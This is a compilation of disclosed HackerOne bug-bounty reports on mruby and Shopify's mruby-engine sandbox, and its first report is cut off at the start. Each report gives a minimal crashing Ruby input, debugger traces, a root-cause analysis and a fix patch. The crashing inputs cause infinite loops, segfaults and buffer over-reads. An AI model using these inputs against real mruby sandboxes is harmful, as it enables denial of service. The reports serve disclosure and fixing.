$x = Time.new
class Tmp
    def to_i
        $x.mday
    end
end
$x.initialize Tmp.new
```

Attached is a patch to mruby to fix this issue.

---

### [Invalid handling of zero-length heredoc identifiers leads to infinite loop in the sandbox](https://hackerone.com/reports/187305)

- **Report ID:** `187305`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @dkasak
- **Bounty:** 10000 usd
- **Disclosed:** 2017-01-12T00:37:21.368Z
- **CVE(s):** -

**Vulnerability Information:**

Introduction
============

Certain invalid Ruby programs (which should normally raise a syntax error) are able to cause an infinite loop in MRuby's parser which makes the mruby-engine sandbox (and consequently the MRI process it is running in) unresponsive to SIGTERM. The process begins looping forever and has to be terminated using SIGABRT or SIGKILL. The bug is caused by an improper handling of heredocs with a zero-length identifier.

Proof of concept
================

infinite_heredoc.rb:
--------------------

    <<''.a begin

1. Save the above code as `infinite_heredoc.rb`.
2. Run either:
   a) `mruby infinite_heredoc.rb`
   b) `sandbox infinite_heredoc.rb`
3. Both cause an infinite loop, but b) also leaves the process unresponsive to SIGTERM.

Discussion
==========

Everything below assumes the latest master of the mruby repository as of Dec 01th, which is commit `2cca9d368815e9c83a7489c40d69937d68cb43a2`.

The `<<''`˙in the above POC code is parsed as a heredoc with an empty identifier. The rest of the POC is needed to bring the parser in a state where it is:

   1. Continually searching for the identifier.
   2. Erroneously thinking it found it, thereby signalling an end of the heredoc by pushing a `tHEREDOC_END` token.
   3. This token is then invalid for the current parser state, which makes it push an error token.
   4. Finally, while processing the error, the parser eventually calls `parse_string` again, which brings the process back to step 1, resulting in an infinite loop.

A variation of the bug, using `do` instead of `begin`:

infinite_heredoc_variation.rb:
------------------------------

    <<''.a do

An excerpt from the parser's debug output, demonstrating the above:

    Reading a token: Next token is token tHEREDOC_END ()
    Error: discarding token tHEREDOC_END ()
    Error: popping token error ()
    Stack now 0 2 81 370 586 257 8 199
    Shifting token error ()
    Entering state 271
    Reading a token: Next token is token tHEREDOC_END ()
    Error: discarding token tHEREDOC_END ()
    [...]

It is interesting to study what output MRI's parser gives for the same input:

    infinite_heredoc.rb:1: can't find string "" anywhere before EOF
    infinite_heredoc.rb:1: syntax error, unexpected end-of-input, expecting tSTRING_CONTENT or tSTRING_DBEG or tSTRING_DVAR or tSTRING_END
    <<''.a begin
        ^

For a heredoc with a non-zero name, both MRuby and MRI produce similar outputs:

heredoc_valid_name.rb
---------------------

    <<'h'.a begin

MRuby output
------------

    heredoc_valid_name.rb:3:0: can't find heredoc delimiter "h" anywhere before EOF
    heredoc_valid_name.rb:3:0: syntax error, unexpected $end

MRI output
----------

    heredoc_valid_name.rb:1: can't find string "h" anywhere before EOF
    heredoc_valid_name.rb:1: syntax error, unexpected end-of-input, expecting tSTRING_CONTENT or tSTRING_DBEG or tSTRING_DVAR or tSTRING_END
    <<'h'.a begin
        ^

Solution
========

The problematic code is located `parse.y`, function `parse_string`, starting at line 3956:

    if ((len-1 == hinf->term_len) && (strncmp(s, hinf->term, len-1) == 0)) {
        return tHEREDOC_END;
    }

The above code checks whether the current heredoc identifier can be matched and, if so, signals the end of the heredoc by returning a `tHEREDOC_END` token. The code is incorrect in the case when the length parameter is 0 due to the use of `strncmp` since it will return 0 even when the input strings are different (as is the case here, where `s` is `"\n"` and `hinf->term` is `""`). Therefore, the check incorrectly succeeds when it shouldn't.

A possible fix is to check whether `hinf->term_len != 0` in addition to the present checks so zero-length heredoc identifiers are invalidated.

empty_heredoc_identifier.patch
------------------------------

    diff --git a/mrbgems/mruby-compiler/core/parse.y b/mrbgems/mruby-compiler/core/parse.y
    index bf893fb..85150fc 100644
    --- a/mrbgems/mruby-compiler/core/parse.y
    +++ b/mrbgems/mruby-compiler/core/parse.y
    @@ -3953,7 +3953,7 @@ parse_string(parser_state *p)
                --len;
            }
            }
    -        if ((len-1 == hinf->term_len) && (strncmp(s, hinf->term, len-1) == 0)) {
    +        if ((len-1 == hinf->term_len) && (strncmp(s, hinf->term, len-1) == 0) && (hinf->term_len != 0)) {
            return tHEREDOC_END;
            }
        }

With the provided patch, MRuby correctly terminates with the POC and issues an error message very similar to the one in MRI:

    infinite_heredoc.rb:3:0: can't find heredoc delimiter "" anywhere before EOF
    infinite_heredoc.rb:3:0: syntax error, unexpected $end

In addition, all the tests pass.

--
Denis Kasak
Damir Jelić

---

### [Broken handling of maximum number of method call arguments leads to segfault](https://hackerone.com/reports/182484)

- **Report ID:** `182484`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @dkasak
- **Bounty:** 10000 usd
- **Disclosed:** 2016-12-21T08:04:12.624Z
- **CVE(s):** -

**Vulnerability Information:**

Introduction
============

Improper logic for handling of maximum number of method call arguments leads to dereferencing an invalid pointer in some cases, which causes a segfault in both mruby and mruby_engine (and the parent MRI).

The crash only happens when the number of arguments, `n == CALL_MAXARGS`, which is 127. If a larger number of arguments are supplied, mruby doesn't crash but it doesn't appear to work as intended either. The intent of the design seems to had been to support a larger number of arguments than CALL_MAXARGS, but that they should then be passed as an array. However, calls with more than CALL_MAXARGS don't succeed, raising an ArgumentError instead.

Proof of Concept
================

crash.rb
--------

    x 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

The above POC is written with line continuations for readability only; the crash doesn't depend on the line continuations, only on there being exactly 127 arguments.

1. Save the above code as crash.rb
2. Run either:
   a) mruby crash.rb
   b) sandbox crash.rb
3. Both cause a segmentation fault.

Discussion
==========

Everything below assumes the latest master of the mruby repository as of Nov 16th, which is commit `1685eff2a5e672173d67916a1c96648df92b7271`.

The crash happens on line 473 of `ext/mruby_engine/mruby/src/array.c`

    if (ARY_SHARED_P(a)

because `a` is a null pointer and the macro `ARY_SHARED_P` tries accessing its `flags` member (`(a)->flags`).

The underlying cause is located in `ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c`, in the function `gen_values`. Inside the `while` loop on line 779, there is a special check for handling both array "splat" mode and more than 126 arguments. This code creates an array as the first argument of the method call which is supposed to contain all the arguments for a method call with more than 126 arguments. Since the rest of the code expects that the first argument is an array when `n == CALL_MAXARGS`, it is vital for this check to happen.

However, when there are exactly 127 arguments, `n` becomes 127 exactly when `t` becomes null at the end of the loop in the assignment `t = t->cdr`. This is expected, because we have reached the last AST node, but then the loop exits early and the special case never happens. This leads to the rest of the code treating the first argument (a `0` fixnum) as an array, leading to the crash.

At first it seemed to us that this is a simple botched check and that shuffling things around a bit in this function should fix it, but it seems there is a deeper problem with the design in multiple places. In particular, calling functions with more than 127 arguments doesn't work at all (even though the special case is triggered in those cases and an array is created):

more_than_127.rb
----------------

    def x(x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16,
          x17, x18, x19, x20, x21, x22, x23, x24, x25, x26, x27, x28, x29, x30,
          x31, x32, x33, x34, x35, x36, x37, x38, x39, x40, x41, x42, x43, x44,
          x45, x46, x47, x48, x49, x50, x51, x52, x53, x54, x55, x56, x57, x58,
          x59, x60, x61, x62, x63, x64, x65, x66, x67, x68, x69, x70, x71, x72,
          x73, x74, x75, x76, x77, x78, x79, x80, x81, x82, x83, x84, x85, x86,
          x87, x88, x89, x90, x91, x92, x93, x94, x95, x96, x97, x98, x99, x100,
          x101, x102, x103, x104, x105, x106, x107, x108, x109, x110, x111, x112,
          x113, x114, x115, x116, x117, x118, x119, x120, x121, x122, x123, x124,
          x125, x126, x127, x128)
    end

    x 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, \
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

This raises a cryptic error message:

    trace:
            [1] more_than_127.rb:1:in Object.x
            [0] more_than_127.rb:20
    ArgumentError: 'x': wrong number of arguments (-1 for 0)

Solution
========

Because of design issues described above, it might be a good idea to patch the security flaw first (if mruby is already deployed somewhere) by limiting the number of arguments to 126:

127_arguments_crash_provisionary.patch
--------------------------------------

    diff --git a/mrbgems/mruby-compiler/core/codegen.c b/mrbgems/mruby-compiler/core/codegen.c
    index 9b064b8..36a6d5f 100644
    --- a/mrbgems/mruby-compiler/core/codegen.c
    +++ b/mrbgems/mruby-compiler/core/codegen.c
    @@ -770,6 +770,8 @@ attrsym(codegen_scope *s, mrb_sym a)
    return mrb_intern(s->mrb, name2, len+1);
    }
    
    +#define CALL_MAXARGS 127
    +
    static int
    gen_values(codegen_scope *s, node *t, int val)
    {
    @@ -824,13 +826,15 @@ gen_values(codegen_scope *s, node *t, int val)
        /* normal (no splat) mode */
        codegen(s, t->car, val);
        n++;
    +    if (n >= CALL_MAXARGS-1) {
    +        raise_error(s, "Too many arguments");
    +        return -1;
    +    }
        t = t->cdr;
    }
    return n;
    }
    
    -#define CALL_MAXARGS 127
    -
    static void
    gen_call(codegen_scope *s, node *tree, mrb_sym name, int sp, int val, int safe)
    {

This makes one test fail at the moment ("Array (Longish inline array)"). We will investigate the issue further and try to come up with a patch that also fixes support for a larger number of arguments.

---

### [Buffer overflow in mrb_time_asctime](https://hackerone.com/reports/188326)

- **Report ID:** `188326`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @haquaman
- **Bounty:** 10000 usd
- **Disclosed:** 2016-12-18T13:22:13.113Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

This one doesn't always crash every time, but with ASAN on it will.

Crash file is:

```
Time.new-0XD00000000000000&0
```

But you could always do `Time.at(sec,usec)` with special values, and basically anything that gets to_s called (`mrb_time_asctime` in C) (in this case, no method found exception does this).

Crashes sometimes in mruby:

```
 $ ./dev/bin/mruby crash.rb
Segmentation fault: 11

```

The times it doesn't crash, it could either return strings outside of memory with a buffer-overead. Some of the lldb runs shows this:

```
$ lldb ./dev/bin/mruby crash.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 66222 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun  00 16:03:04 1901 (NoMethodError)
Process 66222 exited with status = 1 (0x00000001)
(lldb) r
Process 66665 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 66665 exited with status = 1 (0x00000001)
(lldb) r
Process 66889 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 66889 exited with status = 1 (0x00000001)
(lldb) r
Process 67075 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 01 16:03:04 1900 (NoMethodError)
Process 67075 exited with status = 1 (0x00000001)
(lldb) r
Process 67127 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun _defined? 486 16:03:04 2259 (NoMethodError)
Process 67127 exited with status = 1 (0x00000001)
(lldb) r
Process 67341 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 04 16:03:04 1900 (NoMethodError)
Process 67341 exited with status = 1 (0x00000001)
(lldb) r
Process 67904 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 67904 exited with status = 1 (0x00000001)
(lldb) r
Process 68098 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 68098 exited with status = 1 (0x00000001)
(lldb) r
Process 68320 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun  01 16:03:04 1900 (NoMethodError)
Process 68320 exited with status = 1 (0x00000001)
(lldb) r
Process 68514 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 68514 exited with status = 1 (0x00000001)
(lldb) r
Process 68628 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun ) 62 16:03:04 1983 (NoMethodError)
Process 68628 exited with status = 1 (0x00000001)
(lldb) r
Process 68870 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun  00 16:03:04 1901 (NoMethodError)
Process 68870 exited with status = 1 (0x00000001)
(lldb) r
Process 68908 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun  01 16:03:04 1901 (NoMethodError)
Process 68908 exited with status = 1 (0x00000001)
(lldb) r
Process 69130 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 69130 exited with status = 1 (0x00000001)
(lldb) r
Process 69324 launched: './dev/bin/mruby' (x86_64)
Process 69324 stopped
* thread #1: tid = 0x88a312d, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x14010ef30)
    frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18
libsystem_c.dylib`strlen:
->  0x7fff95b0e152 <+18>: pcmpeqb (%rdi), %xmm0
    0x7fff95b0e156 <+22>: pmovmskb %xmm0, %esi
    0x7fff95b0e15a <+26>: andq   $0xf, %rcx
    0x7fff95b0e15e <+30>: orq    $-0x1, %rax
(lldb) bt
* thread #1: tid = 0x88a312d, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x14010ef30)
  * frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18
    frame #1: 0x00007fff95b53a54 libsystem_c.dylib`__vfprintf + 5713
    frame #2: 0x00007fff95b7c6c9 libsystem_c.dylib`__v2printf + 669
    frame #3: 0x00007fff95b60915 libsystem_c.dylib`_vsnprintf + 596
    frame #4: 0x00007fff95b609ca libsystem_c.dylib`vsnprintf + 80
    frame #5: 0x00007fff95b91d08 libsystem_c.dylib`__snprintf_chk + 128
    frame #6: 0x000000010004f15a mruby`mrb_time_asctime + 282
    frame #7: 0x000000010003cf0b mruby`mrb_funcall_with_block + 1515
    frame #8: 0x000000010003c901 mruby`mrb_funcall_argv + 113
    frame #9: 0x000000010000c023 mruby`mrb_method_missing + 275
    frame #10: 0x000000010000da7b mruby`mrb_bob_missing + 123
    frame #11: 0x000000010003fc13 mruby`mrb_vm_exec + 6739
    frame #12: 0x000000010003e1a7 mruby`mrb_vm_run + 135
    frame #13: 0x0000000100046604 mruby`mrb_top_run + 100
    frame #14: 0x0000000100071adf mruby`load_exec + 1183
    frame #15: 0x0000000100071623 mruby`mrb_load_file_cxt + 67
    frame #16: 0x00000001000017d8 mruby`main + 904
    frame #17: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x00000000ffffffff
       rbx = 0x00000000ffffffff
       rcx = 0x000000014010ef38
       rdx = 0x000000014010ef38
       rdi = 0x000000014010ef30
       rsi = 0x00007fff95b52eb9  libsystem_c.dylib`__vfprintf + 2742
       rbp = 0x00007fff5fbfbca0
       rsp = 0x00007fff5fbfbca0
        r8 = 0x0000000000000003
        r9 = 0x000000010007f803  "%s %02d %02d:%02d:%02d %s%d"
       r10 = 0x00007fffa10cd401
       r11 = 0x00007ffe5fb713a0
       r12 = 0x000000010007f805  " %02d %02d:%02d:%02d %s%d"
       r13 = 0x0000000000000073
       r14 = 0x0000000000000073
       r15 = 0x0000000000000003
       rip = 0x00007fff95b0e152  libsystem_c.dylib`strlen + 18
    rflags = 0x0000000000010206
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

With some symbols compiled in:

```
$ lldb ./mruby/bin/mruby crash.rb
(lldb) target create "./mruby/bin/mruby"
Current executable set to './mruby/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 1457 launched: './mruby/bin/mruby' (x86_64)
Process 1457 stopped
* thread #1: tid = 0x88ab040, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x101946780)
    frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18
libsystem_c.dylib`strlen:
->  0x7fff95b0e152 <+18>: pcmpeqb (%rdi), %xmm0
    0x7fff95b0e156 <+22>: pmovmskb %xmm0, %esi
    0x7fff95b0e15a <+26>: andq   $0xf, %rcx
    0x7fff95b0e15e <+30>: orq    $-0x1, %rax
(lldb) up
frame #1: 0x00007fff95b53a54 libsystem_c.dylib`__vfprintf + 5713
libsystem_c.dylib`__vfprintf:
    0x7fff95b53a54 <+5713>: movq   %rax, -0x2f8(%rbp)
    0x7fff95b53a5b <+5720>: movb   $0x0, -0x18f(%rbp)
    0x7fff95b53a62 <+5727>: movl   $0x0, -0x304(%rbp)
    0x7fff95b53a6c <+5737>: movl   %r14d, %r13d
(lldb) up
frame #2: 0x00007fff95b7c6c9 libsystem_c.dylib`__v2printf + 669
libsystem_c.dylib`__v2printf:
    0x7fff95b7c6c9 <+669>: movl   %eax, %ebx
    0x7fff95b7c6cb <+671>: jmp    0x7fff95b7c718            ; <+748>
    0x7fff95b7c6cd <+673>: callq  0x7fff95b91fe4            ; symbol stub for: __error
    0x7fff95b7c6d2 <+678>: movl   (%rax), %ebx
(lldb) up
frame #3: 0x00007fff95b60915 libsystem_c.dylib`_vsnprintf + 596
libsystem_c.dylib`_vsnprintf:
    0x7fff95b60915 <+596>: testq  %rbx, %rbx
    0x7fff95b60918 <+599>: je     0x7fff95b60924            ; <+611>
    0x7fff95b6091a <+601>: movq   -0x1e0(%rbp), %rcx
    0x7fff95b60921 <+608>: movb   $0x0, (%rcx)
(lldb) up
frame #4: 0x00007fff95b609ca libsystem_c.dylib`vsnprintf + 80
libsystem_c.dylib`vsnprintf:
    0x7fff95b609ca <+80>: addq   $0x10, %rsp
    0x7fff95b609ce <+84>: popq   %rbx
    0x7fff95b609cf <+85>: popq   %r12
    0x7fff95b609d1 <+87>: popq   %r14
(lldb) up
frame #5: 0x00007fff95b91d08 libsystem_c.dylib`__snprintf_chk + 128
libsystem_c.dylib`__snprintf_chk:
    0x7fff95b91d08 <+128>: cmpq   -0x10(%rbp), %rbx
    0x7fff95b91d0c <+132>: jne    0x7fff95b91d1d            ; <+149>
    0x7fff95b91d0e <+134>: addq   $0xd8, %rsp
    0x7fff95b91d15 <+141>: popq   %rbx
(lldb)
frame #6: 0x000000010004e8da mruby`mrb_time_asctime(mrb=0x00000001002029f0, self=mrb_value @ 0x00007fff5fbfc530) + 282 at time.c:506
   503
   504    tm = DATA_GET_PTR(mrb, self, &mrb_time_type, struct mrb_time);
   505    d = &tm->datetime;
-> 506    len = snprintf(buf, sizeof(buf), "%s %s %02d %02d:%02d:%02d %s%d",
   507      wday_names[d->tm_wday], mon_names[d->tm_mon], d->tm_mday,
   508      d->tm_hour, d->tm_min, d->tm_sec,
   509      tm->timezone == MRB_TIMEZONE_UTC ? "UTC " : "",
(lldb) p *tm
(mrb_time) $0 = {
  sec = -936748721012153088
  usec = 105092
  timezone = MRB_TIMEZONE_LOCAL
  datetime = {
    tm_sec = 12
    tm_min = 5
    tm_hour = 16
    tm_mday = 1
    tm_mon = 6484120
    tm_year = 1
    tm_wday = 0
    tm_yday = 1
    tm_isdst = 0
    tm_gmtoff = 1701667182
    tm_zone = 0x000a000000000000 <no value available>
  }
}
(lldb) p *d
(tm) $1 = {
  tm_sec = 12
  tm_min = 5
  tm_hour = 16
  tm_mday = 1
  tm_mon = 6484120
  tm_year = 1
  tm_wday = 0
  tm_yday = 1
  tm_isdst = 0
  tm_gmtoff = 1701667182
  tm_zone = 0x000a000000000000 <no value available>
}
(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

Patch to fix would be this:

```
diff --git a/mrbgems/mruby-time/src/time.c b/mrbgems/mruby-time/src/time.c
index dfd4450..5dc5b34 100644
--- a/mrbgems/mruby-time/src/time.c
+++ b/mrbgems/mruby-time/src/time.c
@@ -238,7 +238,9 @@ time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)
     tm->usec -= 1000000;
   }
   tm->timezone = timezone;
-  mrb_time_update_datetime(tm);
+  if (!mrb_time_update_datetime(tm)) {
+    mrb_raisef(mrb, E_ARGUMENT_ERROR, "%S out of Time range", mrb_float_value(mrb, sec));
+  }
 
   return tm;
 }
```

Which now returns:

```
$ ./mruby/bin/mruby crash.rb
        [0] crash.rb:1
crash.rb:1: -9.3674872101215e+17 out of Time range (ArgumentError)

```


Also affected `mruby-engine`:

```
$ ./bin/sandbox crash.rb
./bin/sandbox:20: [BUG] Segmentation fault at 0x0000014531cca0
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0011 e:000010 CFUNC  :sandbox_eval
c:0002 p:0214 s:0006 E:000c80 EVAL   ./bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:001810 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
./bin/sandbox:20:in `<main>'
./bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 rax: 0x00000000ffffffff rbx: 0x00000000ffffffff rcx: 0x000000014531cca0
 rdx: 0x000000014531cca0 rdi: 0x000000014531cca0 rsi: 0x00007fff95b52eb9
 rbp: 0x00007fff528d0400 rsp: 0x00007fff528d0400  r8: 0x0000000000000003
  r9: 0x000000010dd2a24a r10: 0x00007fffa10cd401 r11: 0x00007ffe44bac7b4
 r12: 0x000000010dd2a24c r13: 0x0000000000000073 r14: 0x0000000000000073
 r15: 0x0000000000000003 rip: 0x00007fff95b0e152 rfl: 0x0000000000010206

-- C level backtrace information -------------------------------------------
0   ruby                                0x000000010d4cb5d4 rb_vm_bugreport + 388
1   ruby                                0x000000010d36d023 rb_bug_context + 483
2   ruby                                0x000000010d440653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   libsystem_c.dylib                   0x00007fff95b0e152 strlen + 18
5   ???                                 0x00007fff528d07f0 0x0 + 140734578362352

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
<snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

Abort trap: 6

```

Patch to fix `mruby-engine`:

```
diff --git a/ext/mruby_engine/mruby-time/src/time.c b/ext/mruby_engine/mruby-time/src/time.c
index 8884a5d..2b5d770 100644
--- a/ext/mruby_engine/mruby-time/src/time.c
+++ b/ext/mruby_engine/mruby-time/src/time.c
@@ -236,7 +236,9 @@ time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)
     tm->usec -= 1000000;
   }
   tm->timezone = timezone;
-  mrb_time_update_datetime(tm);
+  if (!mrb_time_update_datetime(tm)) {
+    mrb_raisef(mrb, E_ARGUMENT_ERROR, "%S out of Time range", mrb_float_value(mrb, sec));
+  }
 
   return tm;
 }
```

Now returns:

```
$ ./bin/sandbox crash.rb
./bin/sandbox:20:in `sandbox_eval': -9.3674872249306e+17 out of Time range (MRubyEngine::EngineRuntimeError)
        from ./bin/sandbox:20:in `<main>'

```

Cheers,

Hugh

---

### [Denial of Service in mruby due to null pointer dereference](https://hackerone.com/reports/181232)

- **Report ID:** `181232`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @haquaman
- **Bounty:** 8000 usd
- **Disclosed:** 2016-12-17T20:09:42.923Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

The following file causes a segmentation fault in mruby, which also causes a segmentation fault in mruby-engine. I've minimized this file down to the bare bones what crashes it, and renamed variables so you can see what is needed and what isn't.

```
a=*"any splat operator", case "any object or nil"
when "any value"
  redo |b|
  "any return object"
end
```

```
$ ./dev/bin/mruby --version
mruby 1.2.0 (2015-11-17)
```

```
$ ./dev/bin/mruby crash.rb
Segmentation fault: 11
```

```
$ lldb ./dev/bin/mruby crash.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 18945 launched: './dev/bin/mruby' (x86_64)
Process 18945 stopped
* thread #1: tid = 0x4626e3b, 0x0000000100001814 mruby`ary_modify + 20, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)
    frame #0: 0x0000000100001814 mruby`ary_modify + 20
mruby`ary_modify:
->  0x100001814 <+20>: movl   (%rsi), %eax
    0x100001816 <+22>: shrl   $0xb, %eax
    0x100001819 <+25>: andl   $0x100, %eax              ; imm = 0x100
    0x10000181e <+30>: cmpl   $0x0, %eax
(lldb) bt
* thread #1: tid = 0x4626e3b, 0x0000000100001814 mruby`ary_modify + 20, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)
  * frame #0: 0x0000000100001814 mruby`ary_modify + 20
    frame #1: 0x0000000100001e10 mruby`mrb_ary_push + 48
    frame #2: 0x00000001000426d5 mruby`mrb_vm_exec + 25589
    frame #3: 0x000000010003c2c7 mruby`mrb_vm_run + 135
    frame #4: 0x00000001000446b4 mruby`mrb_top_run + 100
    frame #5: 0x000000010006f19f mruby`load_exec + 1183
    frame #6: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67
    frame #7: 0x0000000100000d78 mruby`main + 904
    frame #8: 0x00007fff8a9db5ad libdyld.dylib`start + 1
    frame #9: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x0000000000000000
       rbx = 0x0000000000000000
       rcx = 0x0000000000000000
       rdx = 0x0000000000000000
       rdi = 0x0000000100600000
       rsi = 0x0000000000000000
       rbp = 0x00007fff5fbfc9f0
       rsp = 0x00007fff5fbfc9c0
        r8 = 0x0000000000000000
        r9 = 0x00007fff5fbfc380
       r10 = 0x5d00add5139cce40
       r11 = 0x0000000000000001
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x0000000100001814  mruby`ary_modify + 20
    rflags = 0x0000000000010206
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) 
```

The cause for this is there is a null `RArray` struct getting sent via a ptr to `mrb_ary_push`, and then the program is trying to retrieve and set members of this null struct.

A patch to fix this would be similar to:
```
diff --git a/src/array.c b/src/array.c
index df95383..47d5ce8 100644
--- a/src/array.c
+++ b/src/array.c
@@ -406,6 +406,9 @@ mrb_ary_push(mrb_state *mrb, mrb_value ary, mrb_value elem)
 {
   struct RArray *a = mrb_ary_ptr(ary);
 
+  /* FIXME: throw an error? */
+  if (!a) return;
+
   ary_modify(mrb, a);
   if (a->len == a->aux.capa)
     ary_expand_capa(mrb, a, a->len + 1);
```


As mentioned above, this also affected mruby-engine via this:

```
13:25 $ ./bin/sandbox crash.rb
./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000002
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:001658 EVAL   ./bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:000c00 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
./bin/sandbox:20:in `<main>'
./bin/sandbox:20:in `sandbox_eval'

